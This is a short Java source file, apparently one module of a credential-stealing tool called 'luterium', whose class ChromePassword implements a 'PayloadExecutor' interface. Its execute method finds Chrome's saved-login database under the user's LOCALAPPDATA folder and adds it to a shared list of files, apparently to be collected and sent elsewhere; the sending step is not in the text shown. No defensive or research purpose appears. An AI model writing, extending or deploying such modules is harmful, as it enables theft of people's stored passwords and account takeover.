package dev.peter.luterium.features;

import dev.peter.luterium.payload.PayloadExecutor;
import dev.peter.luterium.utils.FileUtil;

import java.io.File;
import java.util.Optional;

import static dev.peter.luterium.Main.fileList;

/**
 @author Peter
 @since 08/14/2022
 **/

public class ChromePassword implements PayloadExecutor {
    @Override
    public void execute() throws Exception
    {
        Optional<File> file = FileUtil.getFile(System.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Login Data");

        file.ifPresent(archive -> {
            fileList.add(archive);
        });
    }
}
